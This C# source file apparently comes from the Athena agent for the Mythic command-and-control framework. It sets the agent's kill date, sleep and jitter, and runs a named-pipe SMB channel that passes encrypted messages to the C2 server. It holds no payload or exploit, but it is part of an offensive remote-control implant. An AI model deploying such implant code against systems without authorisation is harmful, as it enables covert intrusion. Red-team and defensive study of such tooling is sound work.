using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Threading.Tasks;
using H.Pipes;
using H.Pipes.Args;

namespace Athena.Config
{
    public class MythicConfig
    {
        public Smb currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public SMBForwarder smbForwarder { get; set; }

        public MythicConfig()
        {
            this.uuid = "%UUID%";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
            this.sleep = sleep;
            int jitter = 0;
            this.jitter = jitter;
            this.currentConfig = new Smb(this.uuid, this);
            this.smbForwarder = new SMBForwarder();
        }
    }

    public class Smb
    {
        public string psk { get; set; }
        private PipeServer<string> serverPipe { get; set; }
        public string pipeName = "pipename";
        private bool connected { get; set; }
        public bool encrypted { get; set; }
        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
        public PSKCrypto crypt { get; set; }
        public ConcurrentQueue<DelegateMessage> queueIn { get; set; }

        public Smb(string uuid, MythicConfig config)
        {
            this.connected = false;
            this.psk = "AESPSK";
            this.queueIn = new ConcurrentQueue<DelegateMessage>();
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }
            this.serverPipe = new PipeServer<string>(this.pipeName);
            this.serverPipe.ClientConnected += (o,args) => DoNewConnection();
            this.serverPipe.ClientDisconnected += (o, args) => DoClientDisconnect();
            this.serverPipe.MessageReceived += (sender, args) => DoMessageReceive(args);
            this.serverPipe.StartAsync();
        }

        private async void DoMessageReceive(ConnectionMessageEventArgs<string> args)
        {
            try
            {
                //Add message to out queue.
                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);
                this.queueIn.Enqueue(dm);
            }
            catch
            {
                DelegateMessage dm = new DelegateMessage()
                {
                    c2_profile = "smb",
                    uuid = "",
                    message = ""
                };
            }
        }

        public async void DoNewConnection()
        {
            this.connected = true;
        }

        public async void DoClientDisconnect()
        {
            this.connected = false;
        }

        //Send, wait for a response, and return it to the main functions
        public async Task<string> Send(object obj)
        {
            //Wait for connection to become available
            while (!connected) { };

            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                //Submit our message to the mythic server and wait for a response
                DelegateMessage dm = new DelegateMessage()
                {
                    uuid = Globals.mc.MythicConfig.uuid,
                    message = json,
                    c2_profile = "smb"
                };
                _ = this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm));

                DelegateMessage res = new DelegateMessage();

                while (!this.queueIn.TryDequeue(out dm)) { if (!connected) {
                        return ""; 
                    } };

                //Decrypt and return
                if (this.encrypted)
                {
                    return this.crypt.Decrypt(dm.message);
                }
                else
                {
                    return Misc.Base64Decode(dm.message).Substring(36);
                }
            }
            catch
            {
                this.connected = false;
                return "";
            }
        }
    }
}
